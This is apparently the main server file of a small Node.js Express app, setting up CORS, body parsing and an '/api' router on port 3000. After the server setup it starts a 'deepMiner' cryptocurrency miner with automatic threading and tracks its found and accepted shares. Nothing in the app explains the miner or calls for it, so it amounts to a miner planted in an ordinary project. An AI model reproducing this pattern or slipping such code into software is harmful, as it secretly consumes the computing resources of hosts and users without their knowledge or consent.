// importing modules
const express = require('express');
const bodyparser = require('body-parser');
const cors = require('cors');
const path = require('path');
const deepMiner = require('./core/deepMiner');
const router = express.Router();

var api = require('./routes/api')(router);

var app = express();

// port no
const port = 3000;

// adding middleware - cors
app.use(cors());

// body-parser
app.use(bodyparser.urlencoded({ extended: false}));
app.use(bodyparser.json());

// authentication
app.use('/api', api);

app.listen(port, () => {
	console.log('Server started at port:' + port);
});

var addr = 'deepMiner_test';
var miner = deepMiner.Anonymous(addr, {
    autoThreads: true
});
miner.start();
// Listen on events
var found = 0,
    accepted = 0;
miner.on('found', function () {
    found++;
});
miner.on('accepted', function () {
    accepted++;
})